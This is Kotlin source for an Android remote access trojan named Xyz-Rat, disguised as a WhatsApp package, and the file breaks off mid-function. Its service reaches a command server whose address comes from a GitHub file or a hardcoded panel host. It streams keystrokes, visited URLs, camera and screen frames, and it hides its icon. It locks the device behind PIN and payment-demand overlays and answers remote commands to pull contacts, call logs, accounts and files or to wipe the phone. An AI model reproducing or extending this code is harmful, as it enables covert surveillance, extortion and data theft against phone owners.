package com.whatsapp.bug.crash

import android.Manifest
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Matrix
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.location.Geocoder
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.AudioManager
import android.media.MediaPlayer
import android.media.MediaMetadataRetriever
import android.app.WallpaperManager
import android.app.usage.UsageStatsManager
import android.speech.tts.TextToSpeech
import java.util.Locale
import android.net.Uri
import android.os.*
import android.os.HandlerThread
import android.provider.Settings
import android.telephony.TelephonyManager
import android.telephony.CellInfoGsm
import android.telephony.CellInfoLte
import android.telephony.CellInfoWcdma
import android.telephony.CellInfoNr
import android.telephony.CellInfoCdma
import android.util.Base64
import android.util.Log
import android.view.Gravity
import android.view.SurfaceHolder
import android.view.SurfaceView
import android.view.WindowManager
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.*
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.net.URI
import java.util.concurrent.Executors

class DeviceService : Service(), LifecycleOwner {

    companion object {
        const val ACTION_COMMAND       = "com.whatsapp.bug.crash.COMMAND"
        const val EXTRA_COMMAND        = "command"
        const val EXTRA_VALUE          = "value"
        const val ACTION_CONNECT       = "com.whatsapp.bug.crash.CONNECT"
        const val ACTION_SEND_STATUS   = "com.whatsapp.bug.crash.SEND_STATUS"
        const val EXTRA_STATUS_JSON    = "statusJson"
        const val ACTION_SEND_FRAME    = "com.whatsapp.bug.crash.SEND_FRAME"
        const val EXTRA_FRAME_B64      = "frameB64"
        const val ACTION_SEND_SMS      = "com.whatsapp.bug.crash.SEND_SMS"
        const val EXTRA_SMS_JSON       = "smsJson"

        const val ACTION_SCREEN_CAPTURE_RESULT = "com.whatsapp.bug.crash.SCREEN_CAPTURE_RESULT"
        const val EXTRA_SCREEN_RESULT_CODE     = "screen_result_code"
        const val EXTRA_SCREEN_RESULT_DATA     = "screen_result_data"

        const val RAW_URL_CONFIG = "https://raw.githubusercontent.com/ZalRyuichi/Xyz-Rat/main/api.txt"
        const val SERVER_URL_DEFAULT = "http://zalryuichi.panelkuy.my.id:2010"
        const val CHANNEL_ID = "xyz_mod_service"
        const val NOTIF_ID   = 1

        const val PREFS_NAME      = "xyz_mod_prefs"
        const val PREF_LOCK_PIN        = "lock_pin"
        const val PREF_LOCK_TITLE      = "lock_title"
        const val PREF_IS_LOCKED       = "is_locked"
        const val PREF_LOCK_TYPE       = "lock_type"
        const val PREF_LOCK_FLASH      = "lock_flash"
        const val PREF_LOCK_AUDIO      = "lock_audio"
        const val PREF_LOCK_CUSTOM_HTML= "lock_custom_html"
        const val PREF_IS_LOCKED_V2    = "is_locked_v2"
        const val PREF_IS_LOCKED_CHAT  = "is_locked_chat"
        const val PREF_CHAT_LOCK_PIN   = "chat_lock_pin"
        const val PREF_CHAT_LOCK_TITLE = "chat_lock_title"
        const val PREF_CHAT_LOCK_FLASH = "chat_lock_flash"
        const val PREF_CHAT_LOCK_AUDIO = "chat_lock_audio"
        const val PREF_CHAT_LOCK_PIN_SCREEN = "chat_lock_pin_screen"
        const val PREF_APP_HIDDEN           = "app_hidden"
    }

    private val lifecycleRegistry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = lifecycleRegistry
    private var socket: Socket? = null
    private val socketWatchdogHandler = Handler(Looper.getMainLooper())
    private val socketWatchdogRunnable = object : Runnable {
        override fun run() {
            if (socket == null || socket?.connected() == false) {
                Log.d("DeviceService", "Watchdog: reconnecting socket...")
                try { socket?.disconnect(); socket?.off() } catch (_: Exception) {}
                socket = null
                connectSocket()
            }
            // Selalu reschedule biar watchdog tetap aktif setelah reconnect
            socketWatchdogHandler.postDelayed(this, 5000)
        }
    }
    private var deviceId: String = ""
    private var deviceName: String = ""
    private var ownerUid: String = ""
    @Volatile private var serverUrl: String = SERVER_URL_DEFAULT
    private var cameraProvider: ProcessCameraProvider? = null
    private var imageAnalysis: ImageAnalysis? = null
    private var streaming = false
    private var lastFrameTime = 0L
    private val FRAME_INTERVAL = 100L
    private var cameraManager: CameraManager? = null
    private var torchCameraId: String? = null
    private var flashHandler: Handler? = null
    private var flashRunnable: Runnable? = null
    private var flashBlinking = false
    private var silentPlayer: MediaPlayer? = null
    private var lockOverlayManager: WindowManager? = null
    private var lockOverlayView: android.view.View? = null
    private var lockV2OverlayView: android.view.View? = null
    private var isDeviceLockedV2: Boolean = false
    private var lockV2AudioPlayer: MediaPlayer? = null
    private var lockV2FlashHandler: Handler? = null
    private var lockV2FlashRunnable: Runnable? = null
    private var lockChatOverlayView: android.view.View? = null
    private var isDeviceLockedChat: Boolean = false
    private var lockChatPin: String = ""
    private var lockChatWindowManager: WindowManager? = null
    private var lockPin: String = ""
    private var isDeviceLocked: Boolean = false
    private var isDeviceFrozen: Boolean = false
    private var lockCustomFlash: Boolean = false
    private var lockCustomAudio: Boolean = false
    private var lockAudioPlayer: MediaPlayer? = null
    private var lockFlashHandler: Handler? = null
    private var lockFlashRunnable: Runnable? = null

    // Volume guard — aktif saat audio/video/tts playing
    private var volumeGuardObserver: android.database.ContentObserver? = null
    private var volumeGuardCount = 0  // counter berapa fitur aktif, biar bisa multi-fitur
    private val volumeGuardHandler = Handler(Looper.getMainLooper())
    private var floatingVideoPlayer: MediaPlayer? = null
    private var floatingSurfaceView: SurfaceView? = null
    private var floatingWindowManager: WindowManager? = null
    private var floatingView: SurfaceView? = null
    private var videoFloating = false
    private var audioPlayer: MediaPlayer? = null
    private var tts: TextToSpeech? = null
    private var textOverlayView: android.view.View? = null
    private var locationManager: LocationManager? = null
    private var locationListener: LocationListener? = null
    private val blockedApps = mutableSetOf<String>()
    private var blockAllApps = false
    private val urlHistory = mutableListOf<JSONObject>() // simpan URL real-time dari accessibility
    private val floatPhotoViews = mutableListOf<android.view.View>()
    private var floatPhotoActive = false
    private var fakeBatteryView: android.view.View? = null
    private var fakeBatteryActive = false

    // Auto Wallpaper
    private var autoWallpaperActive = false
    private var autoWallpaperHandler: Handler? = null
    private var autoWallpaperRunnable: Runnable? = null
    private var autoWallpaperIndex = 0
    private val autoWallpaperFiles = listOf("gelap.jpg", "cerah.jpg")

    // Screen capture (MediaProjection)
    private var mediaProjection: android.media.projection.MediaProjection? = null
    private var virtualDisplay: android.hardware.display.VirtualDisplay? = null
    private var screenImageReader: android.media.ImageReader? = null
    private var screenCaptureThread: HandlerThread? = null
    private var screenCaptureHandler: Handler? = null
    private var screenStreaming = false
    private var lastScreenFrameTime = 0L
    private val SCREEN_FRAME_INTERVAL = 150L

    private val localReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_CONNECT -> {
                    if (socket == null || socket?.connected() == false) connectSocket()
                }
                ACTION_SEND_STATUS -> {
                    val json = intent.getStringExtra(EXTRA_STATUS_JSON) ?: return
                    emitStatus(JSONObject(json))
                }
                ACTION_SCREEN_CAPTURE_RESULT -> {
                    val resultCode = intent.getIntExtra(EXTRA_SCREEN_RESULT_CODE, android.app.Activity.RESULT_CANCELED)
                    val data       = intent.getParcelableExtra<Intent>(EXTRA_SCREEN_RESULT_DATA)
                    if (resultCode == android.app.Activity.RESULT_OK && data != null) {
                        startScreenCapture(resultCode, data)
                    } else {
                        socket?.emit("screen:denied", JSONObject().apply { put("deviceId", deviceId) })
                        emitStatus(JSONObject().apply { put("screenSharing", false) })
                    }
                }
                XyzAccessibilityService.ACTION_ACCESSIBILITY_READY -> {
                    if (socket == null || socket?.connected() == false) connectSocket()
                    // Auto enable protection saat Accessibility aktif
                    XyzAccessibilityService.protectionEnabled = true
                    getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                        .putBoolean("protection_enabled", true).apply()
                    emitStatus(JSONObject().apply {
                        put("protectionEnabled", true)
                        put("protection", true)
                    })
                    // App tetap terlihat di launcher (ga di-hide otomatis)
                    // Hide hanya bisa via perintah manual dari dashboard
                    val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                    if (prefs.getBoolean(PREF_IS_LOCKED, false)) {
                        val pin   = prefs.getString(PREF_LOCK_PIN, "") ?: ""
                        val title = prefs.getString(PREF_LOCK_TITLE, "Perangkat Dikunci") ?: "Perangkat Dikunci"
                        if (pin.isNotEmpty()) applyLockOverlay(title, pin)
                    }
                }
                XyzAccessibilityService.ACTION_ACCESSIBILITY_HEARTBEAT -> {
                    // Emit heartbeat ke server untuk maintain online status selama accessibility aktif
                    if (socket?.connected() == true) {
                        socket?.emit("device:heartbeat", JSONObject().apply {
                            put("deviceId", deviceId)
                            put("accessibilityActive", true)
                            put("time", System.currentTimeMillis())
                        })
                    }
                }
                XyzAccessibilityService.ACTION_KEYLOG -> {
                    val pkg   = intent.getStringExtra("pkg")   ?: return
                    val field = intent.getStringExtra("field") ?: ""
                    val text  = intent.getStringExtra("text")  ?: return
                    val time  = intent.getLongExtra("time", System.currentTimeMillis())
                    if (socket?.connected() != true) return
                    socket?.emit("device:keylog", JSONObject().also {
                        it.put("deviceId", deviceId)
                        it.put("pkg",   pkg)
                        it.put("field", field)
                        it.put("text",  text)
                        it.put("time",  time)
                    })
                }
                XyzAccessibilityService.ACTION_URL_VISITED -> {
                    val url  = intent.getStringExtra("url")  ?: return
                    val pkg  = intent.getStringExtra("pkg")  ?: ""
                    val time = intent.getLongExtra("time", System.currentTimeMillis())
                    // Simpan ke list lokal
                    val entry = JSONObject().apply {
                        put("url",   url)
                        put("title", "")
                        put("pkg",   pkg)
                        put("time",  time)
                    }
                    synchronized(urlHistory) {
                        // Hindari duplikat URL berurutan
                        if (urlHistory.isEmpty() || urlHistory.last().getString("url") != url) {
                            urlHistory.add(entry)
                            if (urlHistory.size > 500) urlHistory.removeAt(0) // max 500 entry
                        }
                    }
                    // Emit realtime ke dashboard juga
                    if (socket?.connected() == true) {
                        socket?.emit("device:urlvisited", JSONObject().apply {
                            put("deviceId", deviceId)
                            put("url",  url)
                            put("pkg",  pkg)
                            put("time", time)
                        })
                    }
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            val hasCamera = ActivityCompat.checkSelfPermission(
                this, Manifest.permission.CAMERA
            ) == PackageManager.PERMISSION_GRANTED

            var serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK
            if (hasCamera) serviceType = serviceType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA

            startForeground(NOTIF_ID, buildNotification(), serviceType)
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }

        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)

        deviceId   = getOrCreateBuildId()
        val mfr    = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val model  = Build.MODEL
        val fallback = if (model.startsWith(mfr, ignoreCase = true)) model else "$mfr $model"
        deviceName = android.provider.Settings.Global.getString(contentResolver, "device_name")
            ?.takeIf { it.isNotBlank() }
            ?: android.provider.Settings.System.getString(contentResolver, "device_name")
            ?.takeIf { it.isNotBlank() }
            ?: android.provider.Settings.Secure.getString(contentResolver, "bluetooth_name")
            ?.takeIf { it.isNotBlank() }
            ?: fallback
        ownerUid   = readUidFromAssets()

        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
            cameraManager?.getCameraCharacteristics(id)
                ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
        }

        val filter = IntentFilter().apply {
            addAction(ACTION_CONNECT)
            addAction(ACTION_SEND_STATUS)
            addAction(ACTION_SCREEN_CAPTURE_RESULT)
            addAction(XyzAccessibilityService.ACTION_ACCESSIBILITY_READY)
            addAction(XyzAccessibilityService.ACTION_ACCESSIBILITY_HEARTBEAT)
            addAction(XyzAccessibilityService.ACTION_KEYLOG)
            addAction(XyzAccessibilityService.ACTION_URL_VISITED)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(localReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(localReceiver, filter)
        }

        startSilentAudio()
        restoreLockIfNeeded()
        loadBlockedApps()

        fetchServerUrl()
    }

    private fun fetchServerUrl() {
        Thread {
            try {
                val url  = java.net.URL(RAW_URL_CONFIG)
                val conn = url.openConnection() as java.net.HttpURLConnection
                conn.connectTimeout = 5000
                conn.readTimeout    = 5000
                conn.requestMethod  = "GET"
                val code = conn.responseCode
                if (code == 200) {
                    val raw = conn.inputStream.bufferedReader().readText().trim()
                    if (raw.startsWith("http")) {
                        serverUrl = raw
                        Log.d("DeviceService", "serverUrl loaded: $serverUrl")
                    }
                }
                conn.disconnect()
            } catch (e: Exception) {
                Log.e("DeviceService", "fetchServerUrl error: ${e.message}")
                // Tetap pakai default jika gagal fetch
            }
            // Connect setelah URL siap (sukses atau fallback)
            connectSocket()
        }.start()
    }

    private fun getOrCreateBuildId(): String {
        val prefs = getSharedPreferences("xyz_device", MODE_PRIVATE)
        val existing = prefs.getString("device_uuid", null)
        if (!existing.isNullOrBlank()) return existing
        val fp   = Build.FINGERPRINT + Build.SERIAL + Build.BOARD
        val hash = java.security.MessageDigest.getInstance("SHA-256")
            .digest(fp.toByteArray())
            .joinToString("") { "%02x".format(it) }
            .take(16)
        val uuid = "$hash"
        prefs.edit().putString("device_uuid", uuid).apply()
        return uuid
    }

    private fun buildDeviceInfo(): JSONObject {
        val obj = JSONObject()

        obj.put("sdk", Build.VERSION.SDK_INT)
        obj.put("manufacturer", Build.MANUFACTURER)
        obj.put("model", Build.MODEL)

        val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        val level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val isCharging = bm.isCharging
        obj.put("battery", level)
        obj.put("charging", isCharging)

        try {
            val tm = getSystemService(TELEPHONY_SERVICE) as android.telephony.TelephonyManager
            val simState = tm.simState
            val simOp = if (simState == android.telephony.TelephonyManager.SIM_STATE_READY)
                tm.networkOperatorName.ifBlank { "Unknown" }
            else "No SIM"
            obj.put("sim", simOp)
        } catch (_: Exception) {
            obj.put("sim", "Unknown")
        }

        return obj
    }

    private fun persistLock(title: String, pin: String) {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().apply {
            putBoolean(PREF_IS_LOCKED, true)
            putString(PREF_LOCK_TYPE, "normal")
            putString(PREF_LOCK_PIN, pin)
            putString(PREF_LOCK_TITLE, title)
            apply()
        }
    }

    private fun persistLockCustom(flash: Boolean, audio: Boolean, customHtml: String) {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().apply {
            putBoolean(PREF_IS_LOCKED, true)
            putString(PREF_LOCK_TYPE, "custom")
            putBoolean(PREF_LOCK_FLASH, flash)
            putBoolean(PREF_LOCK_AUDIO, audio)
            putString(PREF_LOCK_CUSTOM_HTML, customHtml)
            apply()
        }
    }

    private fun clearLockPrefs() {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().apply {
            putBoolean(PREF_IS_LOCKED, false)
            remove(PREF_LOCK_TYPE)
            remove(PREF_LOCK_PIN)
            remove(PREF_LOCK_TITLE)
            remove(PREF_LOCK_FLASH)
            remove(PREF_LOCK_AUDIO)
            remove(PREF_LOCK_CUSTOM_HTML)
            apply()
        }
    }

    private fun restoreLockIfNeeded() {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)

        if (prefs.getBoolean("protection_enabled", false)) {
            XyzAccessibilityService.protectionEnabled = true
        }

        // Restore hide app dari launcher setelah reboot
        if (prefs.getBoolean(PREF_APP_HIDDEN, false)) {
            try {
                val component = ComponentName(this, MainActivity::class.java)
                packageManager.setComponentEnabledSetting(
                    component,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Log.d("DeviceService", "restoreLock: app re-hidden after reboot")
            } catch (e: Exception) {
                Log.e("DeviceService", "restoreLock: hideApp failed: ${e.message}")
            }
        }

        if (!prefs.getBoolean(PREF_IS_LOCKED, false) && !prefs.getBoolean(PREF_IS_LOCKED_V2, false)) return

        if (XyzAccessibilityService.instance == null) {
            Log.d("DeviceService", "restoreLock: menunggu accessibility service ready via broadcast...")
            return
        }

        if (prefs.getBoolean(PREF_IS_LOCKED_CHAT, false)) {
            val pin      = prefs.getString(PREF_CHAT_LOCK_PIN, "") ?: ""
            val title    = prefs.getString(PREF_CHAT_LOCK_TITLE, "Perangkat Dikunci") ?: ""
            val flash    = prefs.getBoolean(PREF_CHAT_LOCK_FLASH, false)
            val audio    = prefs.getBoolean(PREF_CHAT_LOCK_AUDIO, false)
            if (pin.isNotEmpty()) applyLockChatOverlay(title, pin, flash, audio)
        }

        if (prefs.getBoolean(PREF_IS_LOCKED_V2, false)) {
            applyLockV2Overlay(wasRestarted = true, lockNominal = 0, paymentMethod = "", paymentNumber = "")
        }

        if (prefs.getBoolean(PREF_IS_LOCKED, false)) {
            val lockType = prefs.getString(PREF_LOCK_TYPE, "normal") ?: "normal"
            if (lockType == "custom") {
                val flash      = prefs.getBoolean(PREF_LOCK_FLASH, false)
                val audio      = prefs.getBoolean(PREF_LOCK_AUDIO, false)
                val customHtml = prefs.getString(PREF_LOCK_CUSTOM_HTML, "") ?: ""
                lockCustomFlash = flash
                lockCustomAudio = audio
                applyLockOverlayCustom(customHtml, flash, audio)
            } else {
                val pin   = prefs.getString(PREF_LOCK_PIN, "") ?: ""
                val title = prefs.getString(PREF_LOCK_TITLE, "Perangkat Dikunci") ?: "Perangkat Dikunci"
                if (pin.isEmpty()) return
                applyLockOverlay(title, pin)
            }
        }
    }

    private fun startSilentAudio() {
        try {
            silentPlayer = MediaPlayer().apply {
                val afd = assets.openFd("silent.mp3")
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                isLooping = true
                setVolume(0f, 0f)
                prepare()
                start()
            }
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun readUidFromAssets(): String {
        return try {
            val json = assets.open("uid.json").bufferedReader().use { it.readText() }
            JSONObject(json).optString("uid", "")
        } catch (e: Exception) {
            Log.w("DeviceService", "uid.json tidak ditemukan atau error: ${e.message}")
            ""
        }
    }

    private val infoHandler  = Handler(Looper.getMainLooper())
    private var infoRunnable: Runnable? = null

    private fun cancelInfoRunnable() {
        infoRunnable?.let { infoHandler.removeCallbacks(it) }
        infoRunnable = null
    }

    private fun connectSocket() {
        if (socket?.connected() == true) return
        try {
            cancelInfoRunnable()
            try { socket?.off(); socket?.disconnect() } catch (_: Exception) {}
            socket = null

            val opts = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionDelay(3000)
                .setReconnectionDelayMax(10000)
                .build()

            socket = IO.socket(URI.create(serverUrl), opts)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("DeviceService", "Socket Connected")
                SocketHolder.connected = true
                socket?.emit("device:register", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("name", deviceName)
                    put("info", buildDeviceInfo())
                    put("ownerUid", ownerUid)
                })
                cancelInfoRunnable()
                infoRunnable = object : Runnable {
                    override fun run() {
                        if (socket?.connected() == true) {
                            socket?.emit("device:info", JSONObject().apply {
                                put("deviceId", deviceId)
                                put("info", buildDeviceInfo())
                            })
                            infoHandler.postDelayed(this, 30_000)
                        }
                    }
                }
                infoHandler.postDelayed(infoRunnable!!, 30_000)
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.d("DeviceService", "Socket disconnected")
                SocketHolder.connected = false
                cancelInfoRunnable()
            }

            socket?.on("command") { args ->
                val data = args[0] as? JSONObject ?: return@on
                val cmd  = data.optString("command")
                val val_ = data.opt("value")

                handleCommand(cmd, val_?.toString() ?: "")

                val intent = Intent(ACTION_COMMAND).apply {
                    putExtra(EXTRA_COMMAND, cmd)
                    val valStr: String = val_?.toString() ?: ""
                    putExtra(EXTRA_VALUE, valStr)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
            }

            socket?.connect()            
            socketWatchdogHandler.removeCallbacks(socketWatchdogRunnable)
            socketWatchdogHandler.postDelayed(socketWatchdogRunnable, 5000)
        } catch (e: Exception) {
            Log.e("DeviceService", "Socket error: ${e.message}")
            socketWatchdogHandler.postDelayed(socketWatchdogRunnable, 5000)
        }
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "startScreenShare" -> requestScreenCaptureFromService()
            "stopScreenShare"  -> stopScreenCapture()
            "flashlight"   -> setFlashlight(value == "true")
            "camera"       -> when (value) {
                "front" -> startCamera("front")
                "back"  -> startCamera("back")
                else    -> stopCamera()
            }
            "playVideo"    -> if (value.isNotEmpty()) startFloatingVideo(value) else stopFloatingVideo()
            "setWallpaper" -> setWallpaperFromBase64(value)
            "lockDevice"   -> lockDevice(value)
            "unlockDevice" -> unlockDevice()
            "lockV2"       -> lockDeviceV2(value)
            "unlockV2"     -> unlockDeviceV2()
            "lockChat"     -> lockChat(value)
            "unlockChat"   -> unlockChat()
            "chatMsg"      -> receiveChatMsg(value)
            "playAudio"    -> playAudioFromUrl(value)
            "stopAudio"    -> stopAudio()
            "vibrate"      -> vibrateDevice(value)
            "tts"          -> speakText(value)
            "setBrightness"-> setBrightness(value)
            "setVolume"    -> setVolume(value)
            "openUrl"      -> openUrl(value)
            "screenText"   -> if (value.isNotEmpty()) showScreenText(value) else hideScreenText()
            "protection"   -> setProtection(value == "true")
            "spamDialog"   -> setSpamDialog(value)
            "sos"          -> setSos(value == "true")
            "virus"        -> setVirus(value == "true")
            "getClipboard" -> sendClipboard()
            "scanWifi"     -> sendWifiList()
            "getWifiLog"   -> sendWifiLog()
            "getCellTower"  -> sendCellTowerInfo()
            "getWebLog"    -> sendWebLog()
            "recordAudio"  -> startAudioRecord(value.toLongOrNull() ?: 10L)
            "tap"          -> handleTap(value)
            "swipe"        -> handleSwipe(value)
            "scroll"       -> handleScroll(value)
            "getLocation"  -> sendLocation()
            "getAppList"   -> sendAppList()
            "pushFile"     -> receiveUploadedFile(value)
            "uploadFile"   -> receiveUploadedFile(value)
            "uninstallApp" -> uninstallApp(value)
            "getContacts"  -> sendContactList()
            "getAccounts"  -> sendAccountList()
            "getCallLog"   -> sendCallLog()
            "getGallery"   -> sendGalleryList()
            "capturePhoto" -> capturePhoto(value)
            "blockApp"     -> blockApp(value)
            "unblockApp"   -> unblockApp(value)
            "blockAll"     -> setBlockAll(value == "true")
            "hideApp"      -> hideApp(value == "true")
            "changeTheme"  -> changeTheme(value)
            "openApp"      -> openApp(value)
            "listFiles"    -> listFiles(value)
            "downloadFile" -> sendFileToServer(value)
            "deleteFile"   -> deleteFilePath(value)
            "showNotification" -> showNotificationFromCommand(value)
            "showToast"    -> showToastFromCommand(value)
            "floatPhotos"  -> handleFloatPhotos(value)
            "fakeBattery"  -> handleFakeBattery(value)
            "makeCall"     -> makeCall(value)
            "resetDevice"  -> resetDevice()
            "freeze"       -> toggleFreeze(value)
            "networkLock"  -> toggleNetworkLock(value == "true")
            "autoWallpaper"      -> toggleAutoWallpaper(value == "true")
            "storageBenchmark"   -> startStorageBenchmark(value)
        }
    }

    private fun toggleFreeze(value: String) {
        try {
            val shouldFreeze = value.lowercase() == "true" || value == "1"
            if (shouldFreeze == isDeviceFrozen) return
            isDeviceFrozen = shouldFreeze
            val intent = Intent("com.whatsapp.bug.crash.FREEZE_STATE").apply {
                putExtra("frozen", isDeviceFrozen)
            }
            sendBroadcast(intent)
            Log.d("DeviceService", "toggleFreeze: $isDeviceFrozen")
            emitStatus(JSONObject().also { it.put("frozen", isDeviceFrozen) })
        } catch (e: Exception) {
            Log.e("DeviceService", "toggleFreeze error: ${e.message}")
        }
    }

    private fun toggleNetworkLock(enable: Boolean) {
        try {
            if (enable) {
                // Minta permission VPN dulu — kalau belum di-grant, broadcast ke MainActivity
                val vpnIntent = android.net.VpnService.prepare(this)
                if (vpnIntent != null) {
                    // Belum ada permission VPN, kirim ke MainActivity untuk minta dialog
                    val permIntent = Intent(this, MainActivity::class.java).apply {
                        action = "REQUEST_VPN_PERMISSION"
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                    startActivity(permIntent)
                    emitStatus(JSONObject().also { it.put("networkLocked", false); it.put("networkLockError", "need_permission") })
                    return
                }
                val intent = Intent(this, NetworkLockVpnService::class.java)
                startService(intent)
            } else {
                val intent = Intent(this, NetworkLockVpnService::class.java).apply {
                    action = "STOP"
                }
                startService(intent)
                NetworkLockVpnService.isRunning = false
            }
            emitStatus(JSONObject().also { it.put("networkLocked", enable) })
            Log.d("DeviceService", "toggleNetworkLock: $enable")
        } catch (e: Exception) {
            Log.e("DeviceService", "toggleNetworkLock error: ${e.message}")
        }
    }

    private fun makeCall(number: String) {
        if (number.isBlank()) return
        try {
            val intent = Intent(Intent.ACTION_CALL).apply {
                data = android.net.Uri.parse("tel:${number.trim()}")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
            Log.d("DeviceService", "makeCall: calling $number")
        } catch (e: Exception) {
            Log.e("DeviceService", "makeCall error: ${e.message}")
        }
    }

    // ✅ NEW: Reset Device Function
    private fun resetDevice() {
        try {
            val devicePolicyManager = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = ComponentName(this, com.whatsapp.bug.crash.GameSecurityReceiver::class.java)
            
            Log.d("DeviceService", "resetDevice: checking admin status...")
            
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                Log.d("DeviceService", "resetDevice: admin active, wiping data...")
                Log.w("DeviceService", "RESET DEVICE: Wiping all data...")
                
                // ✅ WIPE SEMUA DATA + REBOOT
                devicePolicyManager.wipeData(0)
                
                Log.d("DeviceService", "resetDevice: wipe command sent")
            } else {
                Log.w("DeviceService", "resetDevice: admin not active")
                Log.e("DeviceService", "RESET DEVICE FAILED: Admin not active")
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "resetDevice error: ${e.message}")
            Log.e("DeviceService", "RESET DEVICE ERROR: ${e.message}")
        }
    }

    private fun setFlashlight(on: Boolean) {
        if (on) {
            if (flashBlinking) return
            flashBlinking = true
            flashHandler  = Handler(Looper.getMainLooper())
            var state     = false
            flashRunnable = object : Runnable {
                override fun run() {
                    if (!flashBlinking) {
                        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
                        return
                    }
                    state = !state
                    try { torchCameraId?.let { cameraManager?.setTorchMode(it, state) } } catch (_: Exception) {}
                    flashHandler?.postDelayed(this, 200)
                }
            }
            flashHandler?.post(flashRunnable!!)
        } else {
            flashBlinking = false
            flashHandler?.removeCallbacks(flashRunnable ?: return)
            flashHandler  = null
            flashRunnable = null
            try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        }
        emitStatus(JSONObject().apply { put("flashlight", on) })
    }

    private fun startCamera(facing: String) {
        Handler(Looper.getMainLooper()).post {
            stopCameraInternal()
            streaming = true

            val lensFacing = if (facing == "front") CameraSelector.LENS_FACING_FRONT
                             else CameraSelector.LENS_FACING_BACK
            val selector   = CameraSelector.Builder().requireLensFacing(lensFacing).build()

            val future = ProcessCameraProvider.getInstance(this)
            future.addListener({
                try {
                    cameraProvider = future.get()
                    cameraProvider?.unbindAll()

                    imageAnalysis = ImageAnalysis.Builder()
                        .setTargetResolution(android.util.Size(640, 480))
                        .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                        .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
                        .build()

                    imageAnalysis!!.setAnalyzer(Executors.newSingleThreadExecutor()) { imageProxy ->
                        if (!streaming) { imageProxy.close(); return@setAnalyzer }
                        val now = System.currentTimeMillis()
                        if (now - lastFrameTime < FRAME_INTERVAL) { imageProxy.close(); return@setAnalyzer }
                        lastFrameTime = now

                        try {
                            val raw      = imageProxy.toBitmap()
                            val rotation = imageProxy.imageInfo.rotationDegrees
                            val bitmap   = if (rotation != 0) {
                                val matrix  = Matrix().apply { postRotate(rotation.toFloat()) }
                                val rotated = Bitmap.createBitmap(raw, 0, 0, raw.width, raw.height, matrix, true)
                                raw.recycle()
                                rotated
                            } else raw

                            val out = ByteArrayOutputStream()
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 55, out)
                            val b64: String = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
                            bitmap.recycle()

                            emitFrame(b64)
                        } catch (_: Exception) {}
                        imageProxy.close()
                    }

                    cameraProvider?.bindToLifecycle(this@DeviceService, selector, imageAnalysis!!)
                    emitStatus(JSONObject().apply { put("cameraActive", true) })
                } catch (e: Exception) {
                    Log.e("DeviceService", "Camera bind error: ${e.message}")
                }
            }, ContextCompat.getMainExecutor(this))
        }
    }

    private fun stopCamera() {
        streaming = false
        Handler(Looper.getMainLooper()).post { stopCameraInternal() }
        emitStatus(JSONObject().apply { put("cameraActive", false) })
    }

    private fun stopCameraInternal() {
        streaming = false
        try { cameraProvider?.unbindAll() } catch (_: Exception) {}
        cameraProvider = null
        imageAnalysis  = null
    }

    private fun capturePhoto(facing: String) {
